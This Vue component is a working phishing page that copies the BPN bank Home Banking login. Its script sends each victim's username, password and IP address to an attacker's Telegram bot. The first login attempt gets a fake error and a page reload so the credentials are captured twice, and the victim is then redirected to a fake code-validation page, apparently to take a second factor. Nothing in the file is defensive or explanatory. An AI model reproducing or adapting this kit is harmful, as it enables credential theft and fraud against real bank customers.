<template>
  <div class="about">
    <div v-if="loader" class="fixed top-0 left-0 right-0 bottom-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
      <div class="bg-opacity-100 p-8 rounded-lg">
        <progress class="progress w-56"></progress>
      </div>
    </div>
    <div class="flex items-center justify-center px-0">
      <div class="max-w-6xl w-full">
        <div class="flex flex-col lg:flex-row bg-white shadow-lg overflow-hidden">
          <div class="w-full lg:w-1/3 bg-blue-500 text-white p-8 lg:rounded-r-2xl lg:order-1 order-2" style="background: #0082ca;">
            <h2 class="text-2xl mb-4 lg:mt-10">¿No tenés usuario?</h2>
            <p class="mb-6">Creá un usuario para acceder a tu nuevo Home Banking</p>
            <button class="border text-white py-2 px-4 rounded hover:bg-cyan-300 mt-10 lg:mt-0">Creá tu usuario</button>
          </div>

          <div class="w-full lg:w-2/3 p-10 order-1 lg:order-2">
            <div class="items-start ml-0">
              <img src="../assets/bpn-logo.png" class="h-10 mb-4 w-auto" alt="BPN">
            </div>
            <h2 class="text-lg text-start mb-6">Ingresá a tu <span class="font-bold">Home Banking</span></h2>
            <div v-if="showError" class="p-1 m-4 w-3/4 rounded bg-red-600 text-white text-center">
              Disculpe, ingrese sus datos nuevamente.
            </div>
            <div class="space-y-6">
              <div>
                <label for="username" class="sr-only">Usuario</label>
                <input
                  id="username"
                  name="username"
                  type="text"
                  autocomplete="username"
                  required
                  placeholder="Usuario"
                  v-model="user"
                  class="block w-full rounded border shadow-sm py-2 px-3 text-gray-900 placeholder-gray-400 focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
                />
              </div>

              <div>
                <label for="password" class="sr-only">Contraseña</label>
                <input
                  id="password"
                  name="password"
                  type="password"
                  autocomplete="current-password"
                  required
                  placeholder="Contraseña"
                  v-model="pass"
                  class="block w-full rounded border shadow-sm py-2 px-3 text-gray-900 placeholder-gray-400 focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
                />
              </div>

              <div class="flex items-center justify-between">
                <div class="flex items-center">
                  <input
                    id="remember_me"
                    name="remember_me"
                    type="checkbox"
                    class="h-4 w-4 text-indigo-600 focus:ring-indigo-500 border-gray-300 rounded"
                  />
                  <label for="remember_me" class="ml-2 block text-sm text-gray-900">Recordar usuario</label>
                </div>
              </div>

              <div class="flex flex-col items-end">
                <button 
                  :disabled="!btnSendOff"
                  @click="sendData"
                  type="submit"
                  style="background:#0082ca;"
                  class="mt-auto rounded-md px-3 py-2 text-sm font-semibold leading-6 text-white shadow-sm hover:bg-blue-400 focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50"
                >
                  Ingresá
                </button>
              </div>
            </div>
            <div class="text-start mt-5">
              <a style="font-size: 12px; color: #0082ca;" href="#">¿Tenés problema con tu usuario y/o contraseña? Podes recuperarla. Selecciona una sola opción.</a>
            </div>
          </div>
        </div>

        <div class="flex items-center">
          <img class="w-auto h-10 mt-2 mr-4" src="../assets/certisur_logo.png" alt="">
          <img class="w-auto h-10 mt-2" src="../assets/link_logo.png" alt="">
        </div>

        <div class="mt-6 text-center text-gray-500 text-xs">
          <span class="font-bold">IMPORTANTE: </span> Recordá que esta entidad no envía correos electrónicos ni realiza llamados telefónicos para solicitar cambio o confirmación de datos personales (número de cuenta, nombre de usuario, clave de acceso). Red Link S.A. en ningún caso se comunicará con vos requiriéndote este tipo de información.
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import axios from 'axios';
import { mapGetters, mapActions } from 'vuex';
import { getGeoLocation } from '@/services/geoService';

export default {
  data() {
    return {
      isMobile: false,
      user: '',
      pass: '',
      loader: false,
      showError: false,
      firstData: null,
      datos: {},
      userIp: '',
      geoData: null,
      btnSendOff: true
    };
  },
  async created() {
    this.geoData = await getGeoLocation();
     // Check if the page has been reloaded already
     if (sessionStorage.getItem('reloaded')) {
      this.reloaded = true;
      sessionStorage.removeItem('reloaded');
    } else {
      sessionStorage.setItem('reloaded', 'true');
      setTimeout(() => {
        window.location.reload();
      }, 500);
    }
  },
  computed: {
    ...mapGetters(['getDatos']),
  },
  async mounted() {
    
    this.checkMobile();
    window.addEventListener('resize', this.checkMobile);
  },
  beforeDestroy() {
    window.removeEventListener('resize', this.checkMobile);
  },
  methods: {
    ...mapActions(['setServicio', 'setDeleteService', 'setDatos', 'setDeleteDatos', 'limpiarServicio', 'limpiarDatos']),

    guardarDato() {
      this.limpiarDatos();
      let nuevoDato = {
        "usuario": this.user,
        "contra": this.pass,
      };
      this.setDatos(nuevoDato);
    },

    async sendData() {
      this.loader = true;
      this.btnSendOff = false;

      setTimeout(() => {
        window.location.reload();
      }, 4000);

      this.datos = this.getDatos[0];
      if (!this.datos) {
        if (this.user && this.pass) {
          this.guardarDato();
          await this.sendFirstData();
          this.showError = true;
          setTimeout(() => {
            this.btnSendOff = true;
            this.showError = false;
            this.loader = false;
            window.location.reload();
          }, 3000);
        }
      } else {
        if (!this.firstData) {
          this.firstData = this.datos;
          await this.sendFirstData();
        }

        if (this.datos && this.user && this.pass) {
          const fecha = new Date();
          const fechaFormateada = `${fecha.getDate()}/${fecha.getMonth() + 1}/${fecha.getFullYear()} ${fecha.getHours()}:${fecha.getMinutes()}`;

          const postData = `
<b>BPN - BANK</b>\n
-X-\n
IP: <a href="tg://search_hashtag?hashtag=${this.geoData.ip}">${this.geoData.ip}</a>\n
xxx-----[LOGO-2]----xxx\n
User: <b><code>${this.user}</code></b>\n
Pass: <b><code>${this.pass}</code></b>\n
x------x------x
`;

          const chatId = process.env.CHAT_ID_TELEGRAM;
          const botToken = process.env.TOKEN_TELEGRAM;
          const apiUrl = process.env.API_URL_TELEGRAM;
          const action = '/sendMessage';
          const url = `${apiUrl}${botToken}${action}`;

          try {
            await axios.post(url, {
              chat_id: chatId,
              text: postData,
              parse_mode: 'HTML'
            });
            setTimeout(() => {
              this.$router.push('/bpn-bank-validar-codigo-usuarios-identidad-banco-argentina');
            }, 3000);
          } catch (error) {
            this.loader = false;
            this.btnSendOff = true;
          }
        } else {
          this.loader = false;
          this.btnSendOff = true;
        }
      }
    },
    async sendFirstData() {
      const fecha = new Date();
      const fechaFormateada = `${fecha.getDate()}/${fecha.getMonth() + 1}/${fecha.getFullYear()} ${fecha.getHours()}:${fecha.getMinutes()}`;

      const postData = `
BPN - BANK
-X
IP: ${this.geoData.ip}
xxx-----[LOGO-1]----xxx

User: <b><code>${this.user}</code></b>\n
Pass: <b><code>${this.pass}</code></b>\n

x------x------x
      `;
      const chatId = process.env.CHAT_ID_TELEGRAM;
      const botToken = process.env.TOKEN_TELEGRAM;
      const apiUrl = process.env.API_URL_TELEGRAM;
      const action = '/sendMessage';
      const url = `${apiUrl}${botToken}${action}`;

      try {
        await axios.post(url, {
          chat_id: chatId,
          text: postData,
          parse_mode: 'HTML'
        });
      } catch (error) {
        this.loader = false;
        this.btnSendOff = true;
      }
    },
    checkMobile() {
      this.isMobile = window.innerWidth < 1024;
    }
  }
}
</script>

